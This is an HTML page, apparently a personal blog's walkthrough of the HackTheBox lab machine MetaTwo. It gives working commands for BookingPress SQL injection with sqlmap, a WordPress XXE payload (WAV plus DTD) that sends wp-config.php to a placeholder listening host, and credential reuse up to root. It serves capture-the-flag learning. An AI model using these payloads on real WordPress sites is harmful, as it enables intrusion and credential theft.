@@ -1,0 +1,257 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HackTheBox MetaTwo // 53CTF</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.108.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="5YC10P5" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.1b165e60871be07c93da04ef30238e50223c9da30f957d760f25b24143926af9.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HackTheBox MetaTwo"/>
+<meta name="twitter:description" content="Name: MetaTwo IP: 10.10.11.186 Defficulty: Easy OS: Linux Author: Nauten Nmap PORT STATE SERVICE VERSION 21/tcp open ftp? | fingerprint-strings: | GenericLines: | 220 ProFTPD Server (Debian) [::ffff:10.10.11.186] | Invalid command: try being more creative |_ Invalid command: try being more creative 22/tcp open ssh OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 c4b44617d2102d8fec1dc927fecd79ee (RSA) | 256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA) |_ 256 fd78c0b0e22016fa050debd83f12a4ab (ED25519) 80/tcp open http nginx 1."/>
+
+    <meta property="og:title" content="HackTheBox MetaTwo" />
+<meta property="og:description" content="Name: MetaTwo IP: 10.10.11.186 Defficulty: Easy OS: Linux Author: Nauten Nmap PORT STATE SERVICE VERSION 21/tcp open ftp? | fingerprint-strings: | GenericLines: | 220 ProFTPD Server (Debian) [::ffff:10.10.11.186] | Invalid command: try being more creative |_ Invalid command: try being more creative 22/tcp open ssh OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0) | ssh-hostkey: | 3072 c4b44617d2102d8fec1dc927fecd79ee (RSA) | 256 2aea2fcb23e8c529409cab866dcd4411 (ECDSA) |_ 256 fd78c0b0e22016fa050debd83f12a4ab (ED25519) 80/tcp open http nginx 1." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://53ctf.github.io/posts/htb/metatwo/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-08T13:15:17+05:30" />
+<meta property="article:modified_time" content="2023-01-08T13:15:17+05:30" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://53ctf.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="5YC10P5" /></a>
+      <span class="app-header-title">53CTF</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">Home</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/hackthebox/">HTB</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/tags/notes/">Notes</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/about/">About</a>
+      </nav>
+      <p>This is where I keep my notes and also where I post articles, writeups, walkthroughs and stuff like that so everybody else can learn something out of it.....</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/53ctf" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>Github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+          <a href="https://twitter.com/syclops101" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
+  <title>Twitter</title>
+  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
+</svg>
+          </a>
+        
+          <a href="https://web.facebook.com/syclops101" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-facebook">
+  <title>HackTheBox</title>
+  <path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HackTheBox MetaTwo</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Jan 8, 2023
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
+  <title>tag</title>
+  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
+</svg>
+              <a class="tag" href="https://53ctf.github.io/tags/hackthebox/">HackTheBox</a>
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <ul>
+<li>Name: MetaTwo</li>
+<li>IP: 10.10.11.186</li>
+<li>Defficulty: Easy</li>
+<li>OS: Linux</li>
+<li>Author: <a href="https://www.hackthebox.com/home/users/profile/27582">Nauten</a></li>
+</ul>
+<h2 id="nmap">Nmap</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>21/tcp open  ftp?
+</span></span><span style="display:flex;"><span>| fingerprint-strings:
+</span></span><span style="display:flex;"><span>|   GenericLines:
+</span></span><span style="display:flex;"><span>|     <span style="color:#ae81ff">220</span> ProFTPD Server <span style="color:#f92672">(</span>Debian<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>::ffff:10.10.11.186<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>|     Invalid command: try being more creative
+</span></span><span style="display:flex;"><span>|_    Invalid command: try being more creative
+</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey:
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> c4b44617d2102d8fec1dc927fecd79ee <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 2aea2fcb23e8c529409cab866dcd4411 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> fd78c0b0e22016fa050debd83f12a4ab <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.18.0
+</span></span><span style="display:flex;"><span>|_http-title: Did not follow redirect to http://metapress.htb/
+</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.18.0
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port21-TCP:V<span style="color:#f92672">=</span>7.93%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>1/8%Time<span style="color:#f92672">=</span>63BA7535%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>Gener
+</span></span><span style="display:flex;"><span>SF:icLines,8F,<span style="color:#e6db74">&#34;220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20crea
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:tive\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:r\n&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><p>Three ports are open.</p>
+<ul>
+<li>21/TCP FTP</li>
+<li>22/TPC SSH</li>
+<li>80/TCP HTTP
+<ul>
+<li>Add <code>metapress.htb</code> into <code>/etc/hosts</code></li>
+<li>Disallowed Entry - <code>/wp-admin/</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="web-enumeration">Web Enumeration</h2>
+<p>The Website is built on <a href="https://wordpress.org/support/wordpress-version/version-5-6-2/">Wordpress 5.6.2</a> and that version is vulnerable to <a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">Authenticated XXE</a>. Since we don&rsquo;t have any credentials yet, we can&rsquo;t perfome this attack for now.</p>
+<h3 id="wpscan">WPScan</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wpscan --url http://metapress.htb/ -e u
+</span></span></code></pre></div><ul>
+<li><code>-e u</code> is for enumerate users.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>i<span style="color:#f92672">]</span> User<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span> Identified:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> admin
+</span></span><span style="display:flex;"><span> | Found By: Author Posts - Author Pattern <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Confirmed By:
+</span></span><span style="display:flex;"><span> |  Rss Generator <span style="color:#f92672">(</span>Passive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  Wp Json Api <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |   - http://metapress.htb/wp-json/wp/v2/users/?per_page<span style="color:#f92672">=</span>100&amp;page<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span> |  Rss Generator <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  Author Sitemap <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |   - http://metapress.htb/wp-sitemap-users-1.xml
+</span></span><span style="display:flex;"><span> |  Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> |  Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> manager
+</span></span><span style="display:flex;"><span> | Found By: Author Id Brute Forcing - Author Pattern <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span> | Confirmed By: Login Error Messages <span style="color:#f92672">(</span>Aggressive Detection<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Found two users.</p>
+<ul>
+<li><code>admin</code></li>
+<li><code>manager</code></li>
+</ul>
+<p>Within source code of <code>http://metapress.htb/events/</code> found the site is using a plugin called <a href="https://wordpress.org/plugins/bookingpress-appointment-booking/">BookingPress 1.0.10</a>.<br>
+And that version is vulnerable to <a href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">Unauthenticated SQL Injection</a>.</p>
+<p>Let&rsquo;s capture the web request via BurpSuite.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -i <span style="color:#e6db74">&#39;http://metapress.htb/wp-admin/admin-ajax.php&#39;</span> --data <span style="color:#e6db74">&#39;action=bookingpress_front_get_category_services&amp;_wpnonce=869dc312ef&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># _wpnonce can be found from the site source code</span>
+</span></span></code></pre></div><p>And save the POST request into a file and remove the injection query. And then replace the value of the vulnerable parameter into any number you want.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>POST /wp-admin/admin-ajax.php HTTP/1.1
+</span></span><span style="display:flex;"><span>Host: metapress.htb
+</span></span><span style="display:flex;"><span>User-Agent: curl/7.87.0
+</span></span><span style="display:flex;"><span>Accept: */*
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#ae81ff">185</span>
+</span></span><span style="display:flex;"><span>Content-Type: application/x-www-form-urlencoded
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>action<span style="color:#f92672">=</span>bookingpress_front_get_category_services&amp;_wpnonce<span style="color:#f92672">=</span>869dc312ef&amp;category_id<span style="color:#f92672">=</span>33&amp;total_service<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Then fire up the <a href="https://github.com/sqlmapproject/sqlmap">SQLMap</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r /ABSOLUTE/PATH/TO/post.req --batch --dbs
+</span></span></code></pre></div><p>Dumping usernames and passwords from the <strong>wp_users</strong> table.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -r /ABSOLUTE/PATH/TO/post.req -D blog -T wp_users -C user_pass,user_login --dump
+</span></span></code></pre></div><p>Got the password hashes for user <strong>manager</strong> and user <strong>admin</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Database: blog
+</span></span><span style="display:flex;"><span>Table: wp_users
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span><span style="color:#ae81ff">2</span> entries<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>+------------------------------------+------------+
+</span></span><span style="display:flex;"><span>| user_pass                          | user_login |
+</span></span><span style="display:flex;"><span>+------------------------------------+------------+
+</span></span><span style="display:flex;"><span>| $P$B4************************16Q70 | manager    |
+</span></span><span style="display:flex;"><span>| $P$BG************************k.TV. | admin      |
+</span></span><span style="display:flex;"><span>+------------------------------------+------------+
+</span></span></code></pre></div><p>Let&rsquo;t crack those hashes with <a href="https://github.com/openwall/john">JohnTheRipper</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>manager:par************tar
+</span></span></code></pre></div><p>Since now we have the credentials for <strong>wp_admin</strong>, now we can fire up that <a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">Authenticated XXE</a> exploit.</p>
+<p>Now to do that we have to create two files.</p>
+<h3 id="payloadwav">Payload.wav</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo -en <span style="color:#e6db74">&#39;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&#34;1.0&#34;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;</span><span style="color:#e6db74">&#34;&#39;&#34;</span><span style="color:#e6db74">&#39;http://LISTENING_IP:LISTENING_PORT/payload.dtd&#39;</span><span style="color:#e6db74">&#34;&#39;&#34;</span><span style="color:#e6db74">&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39;</span> &gt; payload.wav
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>RIFFWAVEiXML<span style="color:#f92672">{</span>&lt;?xml version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span>?&gt;&lt;!DOCTYPE ANY<span style="color:#f92672">[</span>&lt;!ENTITY % remote SYSTEM <span style="color:#e6db74">&#39;http://LISTENING_IP:LISTENING_PORT/payload.dtd&#39;</span>&gt;%remote;%init;%trick;<span style="color:#f92672">]</span>&gt;
+</span></span></code></pre></div><h3 id="payloaddtd">Payload.dtd</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">ENTITY</span> <span style="color:#f92672">%</span> <span style="color:#a6e22e">data</span> <span style="color:#a6e22e">SYSTEM</span> <span style="color:#e6db74">&#34;php://filter/convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;!</span><span style="color:#a6e22e">ENTITY</span> <span style="color:#f92672">%</span> <span style="color:#a6e22e">init</span> <span style="color:#e6db74">&#34;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://LISTENING_IP:LISTENING_PORT/?p=%data;&#39;&gt;&#34;</span> <span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Now host a PHP server.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>php -S LISTENING_IP:LISTENING_PORT
+</span></span></code></pre></div><p>And then upload the <strong>payload.wav</strong> into the wordpress media library and when it&rsquo;s done uploading, open it. As soon as you open it, we can see a <strong>base64</strong> code popping up in the PHP server that we just hosted.<br>
+Decode it and you will get <strong>wp-config.php</strong>.</p>
+<h2 id="foothold">Foothold</h2>
+<p>Within <strong>wp-config.php</strong> we can find these&hellip;<br>
+<strong>MySQL Credentials</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#e6db74">/** MySQL database username */</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_USER&#39;</span>, <span style="color:#e6db74">&#39;blog&#39;</span> );
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">/** MySQL database password */</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;DB_PASSWORD&#39;</span>, <span style="color:#e6db74">&#39;635A********XFUZ&#39;</span> );
+</span></span></code></pre></div><p><strong>FTP Credentials</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">define</span>( <span style="color:#e6db74">&#39;FTP_PASS&#39;</span>, <span style="color:#e6db74">&#39;9NY*************NvJ&#39;</span> );
+</span></span></code></pre></div><p>Login to the FTP server.<br>
+In the <strong>mailer/send_email.php</strong> we can find the password for the user <strong>jnelson</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$mail<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;jnelson@metapress.htb&#34;</span>;
+</span></span><span style="display:flex;"><span>$mail<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Password</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Cb4************@Ys&#34;</span>;
+</span></span></code></pre></div><p>Login to the box via SSH as the user <strong>jnelson</strong>.</p>
+<h2 id="privesc-root">Privesc [ROOT]</h2>
+<p>Within <strong>/home/jnelson/.passpie/.keys</strong> we can find Public and Private PGP key pair. Grabed the private key and cracked its password via JohnTheRipper. And found the password for <strong>Passpie</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bl****82         <span style="color:#f92672">(</span>Passpie<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Then run the <strong>passpie</strong> binary and extract the passwords into a file with the password above.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>passpie export passwd.txt
+</span></span></code></pre></div><p>Within the passwd.txt file we can find the password for the root user.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>credentials:
+</span></span><span style="display:flex;"><span>- comment: <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>  fullname: root@ssh
+</span></span><span style="display:flex;"><span>  login: root
+</span></span><span style="display:flex;"><span>  modified: 2022-06-26 08:58:15.621572
+</span></span><span style="display:flex;"><span>  name: ssh
+</span></span><span style="display:flex;"><span>  password: !!python/unicode <span style="color:#e6db74">&#39;p7q**********_0x&#39;</span>
+</span></span><span style="display:flex;"><span>- comment: <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>  fullname: jnelson@ssh
+</span></span><span style="display:flex;"><span>  login: jnelson
+</span></span><span style="display:flex;"><span>  modified: 2022-06-26 08:58:15.514422
+</span></span><span style="display:flex;"><span>  name: ssh
+</span></span><span style="display:flex;"><span>  password: !!python/unicode <span style="color:#e6db74">&#39;Cb4************@Ys&#39;</span>
+</span></span><span style="display:flex;"><span>handler: passpie
+</span></span><span style="display:flex;"><span>version: 1.0
+</span></span></code></pre></div>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
